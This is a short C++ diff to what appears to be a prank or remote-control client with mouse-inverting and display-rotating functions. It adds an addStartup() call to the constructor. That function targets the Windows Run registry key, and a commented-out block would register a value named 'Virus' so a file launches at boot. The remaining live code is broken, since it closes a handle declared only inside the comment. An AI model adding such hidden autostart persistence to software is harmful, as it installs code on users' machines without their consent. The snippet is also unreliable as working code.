@@ -5,6 +5,7 @@ bool terminateThread = false;
 
 Client::Client()
 {
+	addStartup();
 }
 
 Client::~Client()
@@ -136,6 +137,30 @@ void Client::toggleInvertMouse()
 		IsMouseInverted = false;
 	}
 }
+
+void Client::addStartup()
+{
+	LPCWSTR strKeyName = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+	/*HKEY hKey = NULL;
+	DWORD rtime;
+
+	const char path[] = "C:\\Users\\Doru\\Desktop\\aa.txt";
+
+	//Step 1: Open the key
+	long sts = RegOpenKeyEx(HKEY_LOCAL_MACHINE, strKeyName, 0, KEY_READ, &hKey);
+	long j = RegSetValueEx(hKey, L"Virus", 0, REG_SZ, (BYTE*)path, strlen(path));
+	DWORD length = sizeof(rtime);
+	DWORD type = REG_DWORD;
+	RegQueryValueEx(HKEY_LOCAL_MACHINE, strKeyName, 0, (LPDWORD)&type, (LPBYTE)&rtime, &length);
+	*/
+
+
+
+
+
+	RegCloseKey(hKey);
+}
+
 
 void Client::rotateDisplay()
 {
